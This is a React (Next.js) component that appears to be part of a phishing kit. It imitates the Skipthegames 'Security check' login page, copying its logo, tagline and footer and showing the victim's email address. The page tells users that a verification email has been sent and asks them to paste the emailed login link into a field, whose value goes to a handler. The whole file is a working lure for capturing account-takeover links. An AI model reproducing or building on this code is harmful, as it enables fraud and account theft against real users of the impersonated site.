import Image from "next/image"
import Logo from "@/public/image/Skipthegames-255x39.png"
import React, { useState } from "react"
import Loding from "@/public/icon/loding"

interface secondPage {
    ChengOTPEvent: (otp: string) => void;
    handleNext: () => void;
    ErrorMessge: string;
    geetemail: string;
}

const SecondPage: React.FC<secondPage> = ({ ChengOTPEvent, handleNext, ErrorMessge, geetemail }) => {

    const handlEmailChange = ({ otp }: { otp: string }) => {
        ChengOTPEvent(otp)
    }

    return (
        <main className="w-screen h-screen flex flex-col ph:gap-4">
            <header className="w-full ph:h-[70px] lt:h-[90px] ph:px-5 flex justify-between lt:px-[160px] py-1">
                <div className="w-auto h-full">
                    <Image priority={true} src={Logo} quality={100} className="h-[58%] w-auto cursor-pointer" alt="Logo" />
                    <span className="lt:text-[13px] ph:text-[11px] font-medium">Skip the games. Get satisfaction.</span>
                </div>
                <div className="w-auto h-full flex flex-col items-end">
                    <span className="text-red-700 underline text-base">{geetemail}</span>
                    <div className="flex gap-2 justify-center items-center">
                        <span className="text-sm text-gray-400">go to your account</span>
                        <div className="w-[2px] h-2/3 bg-slate-500"></div>
                        <span className="text-red-700 text-base">Log out</span>
                    </div>
                </div>
            </header>
            <section className="w-full h-[480px] flex ph:px-5 lt:px-[160px]">
                <div className="ph:w-full h-full flex flex-col gap-[18px]">
                    <h1 className="text-black lt:text-[33px] ph:text-2xl">Security check</h1>
                    <span className="lt:text-base ph:text-[12px]">
                        We have upgraded our security to protect all users against account takeovers and hacking.
                    </span>
                    <div className="flex gap-1 h-auto w-auto lt:items-center lt:flex-row ph:flex-col">
                        <span className="lt:text-base ph:text-[12px]">
                            To complete this login, an Email has been sent to your address <strong>{geetemail}</strong>.
                        </span>
                        <span className="text-xs underline text-red-700">
                            I do not have access to this email account
                        </span>
                    </div>
                    <span className="text-cyan-500">
                        Please wait few minits we are sending a new email. After then enter this email link:
                    </span>
                    <div className="lt:w-[45%] ph:w-full h-auto flex flex-col gap-5">
                        <div className="w-full h-auto flex flex-col">
                            <input type="email" required onChange={(e) => { handlEmailChange({ otp: e.target.value }) }} className="h-12 p-3 text-black outline-none shadow-inner" placeholder="Please copy and then paste this link into a from (a bar) on a web page:" />
                            {/* <div className={` ${ErrorMessge === "Please enter a valid email address" ? "flex" : "hidden"} py-5 px-4  rounded-b-md w-full h-6 bg-red-500 text-white items-center`}>
                                {ErrorMessge}
                            </div> */}
                        </div>
                    </div>
                    <button onClick={handleNext} className="lt:w-[45%] ph:w-full flex justify-center items-center h-[65px] bg-cyan-500 text-white rounded-md text-xl transition-all duration-300 hover:bg-cyan-600">
                        {ErrorMessge === "Loading" ? <Loding /> : "Submit"}
                    </button>
                    <div className="w-full h-auto flex flex-col py-2">
                        <div className="w-full h-auto flex gap-2">
                            <h2 className="lt:text-xl ph:text-sm font-bold">The email you received is good for 30 minutes.</h2>
                        </div>
                        <div className="w-full h-auto flex gap-1 py-4">
                            <span className="lt:text-sm ph:text-[12px]">It may take the code up to 10 minutes to arrive. Make sure to check your Spam/Junk/Trash folder.</span>
                        </div>
                        <div className="w-full h-auto flex gap-5 py-6">
                            <span className="lt:text-lg cursor-pointer ph:text-[12px] text-red-800 underline">Resend the code</span>
                            <span className="lt:text-lg cursor-pointer ph:text-[12px] underline text-red-800 font-medium">I do not have access to this email account</span>
                        </div>
                    </div>
                </div>
            </section>
            <div className="w-full h-auto flex justify-center items-center">
                <div className="lt:w-[80%] ph:w-[95%]">
                    <hr />
                    <hr />
                </div>
            </div>
            <div className="w-full h-auto flex justify-center items-center">
                <div className="lt:w-[80%] ph:w-full ph:px-5 h-auto lt:py-6 flex pc:flex-row ph:flex-col ph:gap-5 lt:gap-60">
                    <h2 className="text-xl text-gray-500 hover:text-red-800 cursor-pointer">©Skipthegames.eu</h2>
                    <div className="w-auto h-auto flex">
                        <ul className="flex text-[18px] gap-7 ph:gap-5">
                            <li className="cursor-pointer pc:text-lg ph:text-base text-gray-400 hover:text-red-800">Home</li>
                            <li className="cursor-pointer pc:text-lg ph:text-base text-red-800">Contact</li>
                            <li className="cursor-pointer pc:text-lg ph:text-base text-red-800">About</li>
                            <li className="cursor-pointer pc:text-lg ph:text-base text-red-800">Privacy</li>
                            <li className="cursor-pointer pc:text-lg ph:text-base text-red-800">Terms</li>
                            <li className="cursor-pointer pc:text-lg ph:text-base text-red-800">Escort Info</li>
                        </ul>
                    </div>
                </div>
            </div>
        </main>
    )
}

export default SecondPage

